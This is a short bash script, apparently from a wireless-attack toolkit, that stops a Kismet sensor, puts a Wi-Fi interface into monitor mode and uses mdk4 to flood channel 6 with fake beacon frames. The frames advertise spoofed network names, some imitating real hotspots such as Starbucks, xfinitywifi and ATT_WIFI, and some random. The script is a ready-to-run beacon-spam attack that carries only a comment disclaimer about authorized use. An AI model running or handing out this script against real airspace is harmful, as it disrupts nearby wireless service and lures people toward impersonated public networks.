#!/bin/bash
DIR="${DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
[ -f "$DIR/.env" ] && . "$DIR/.env"
AP_IF="${AP_IF:-wlan0}"
MON_IF="${MON_IF:-wlan1}"
# Pineapple Express - Beacon Spam via mdk4
# Floods the air with fake SSIDs on $MON_IF (monitor mode)
# USE ONLY in authorized environments / your own airspace.
trap 'systemctl start kismet-sensor.service 2>/dev/null; exit' EXIT INT TERM

# Generate SSID list
SSID_FILE=/tmp/beacon-ssids.txt
cat > "$SSID_FILE" << 'SSIDS'
FreeWifi_Airport
Starbucks_Invitados
McDonalds_Free_WiFi
Hotel_Lobby_Guest
xfinitywifi
ATT_WIFI
CableWifi_Hotspot
Boingo_Hotspot
linksys
NETGEAR_Guest
AndroidAP
iPhone_Hotspot
AndroidHotspot
PublicWiFi
FREE_INTERNET
_FREE_WIFI_
Open_Network
Vodafone_Guest
Movistar_Guest
Orange_WiFi
SSIDS

for i in $(seq 1 30); do
    printf "WiFi_%04d\n" $RANDOM >> "$SSID_FILE"
done

# Stop Kismet and put $MON_IF in monitor mode
systemctl stop kismet-sensor.service 2>/dev/null
pkill -9 -f kismet_cap_linux_wifi 2>/dev/null
sleep 0.5

ip link set $MON_IF down 2>/dev/null
iw dev $MON_IF set type monitor 2>/dev/null
ip link set $MON_IF up 2>/dev/null
sleep 1.0
# Force 2.4GHz channel before mdk4 (RTL8811CU defaults to 5GHz after Kismet)
iw dev $MON_IF set channel 6 2>/dev/null
sleep 0.3

# Check mdk4 available
if ! command -v mdk4 >/dev/null 2>&1; then
    echo "mdk4 no encontrado (apt install mdk4)" >&2
    exit 1
fi

# Spam: beacon mode, SSID file, 100 packets/s, channel 6 (RTL8811CU no soporta channel hopping)
mdk4 $MON_IF b -f "$SSID_FILE" -s 100 -c 6
